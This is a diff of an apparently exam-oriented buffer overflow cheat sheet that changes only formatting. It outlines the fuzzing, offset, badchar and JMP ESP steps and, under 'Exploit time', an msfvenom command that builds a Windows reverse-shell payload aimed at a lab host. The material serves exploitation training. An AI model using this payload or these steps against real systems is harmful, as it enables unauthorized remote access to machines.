@@ -1,5 +1,5 @@
-Repo: https://github.com/V1n1v131r4/OSCP-Buffer-Overflow
-Additional Tutorial: https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf
+- Repo: https://github.com/V1n1v131r4/OSCP-Buffer-Overflow
+- Additional Tutorial: https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf
 
 # OSCP Buffer Overflow Cheat Sheet
 
@@ -15,7 +15,6 @@ Below are the download links for all the tools needed for the study:
 
 All installation processes are described in the links above.
 
-
 ## Fuzzing
 
 We will run the `connect.py` script to verify the application's response.
@@ -23,7 +22,6 @@ We will run the `connect.py` script to verify the application's response.
 After this step, we will run the `fuzzing.py` script to identify the point that the application will crash. But before that, on your Windows, attach the application to the Immunity Debugger.
 
 Change the amount of "A" in the script until the application broken.
-
 
 ## Offset
 
@@ -41,16 +39,13 @@ msf-pattern_offset -q 39654138
 
 Now we can run `poc.py` and verify that our EIP has been overwritten with the character "B" (42 in hexadecimal)
 
-
 ## Badchars
 
 To identify badchars we will use mona with the option `!mona bytearray`.
 
 Insert the mona output in the `badchars.py` script and run against the application to identify the badchars.
 
-
 There are many ways to carry out the badchar identification process (even mona has modules for that), but the most accurate way is visually. Follow the ASCII string in the Immunity Debugger and see what points this string crashed or skipped over.
-
 
 ## JMP ESP
 
@@ -71,17 +66,15 @@ At this point you will have the base address of the stack or return address (EBP
 ```
 0x080416BF  <->  "\xBF\x16\x04\x08"
 ```
- 
- 
- ## Exploit time
- 
- We can now generate our shellcode excluding the badchars found:
- 
- ```
- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"
- ```
- 
- The `EXITFUNC=thread` option prevents the shellcode from crashing the application when executing our shellcode.
- 
- Now just insert the msfvenom output in our `exploit.py` and run it against our application to gain access to the system exploiting the Buffer Overflow
 
+## Exploit time
+
+We can now generate our shellcode excluding the badchars found:
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"
+```
+
+The `EXITFUNC=thread` option prevents the shellcode from crashing the application when executing our shellcode.
+
+Now just insert the msfvenom output in our `exploit.py` and run it against our application to gain access to the system exploiting the Buffer Overflow
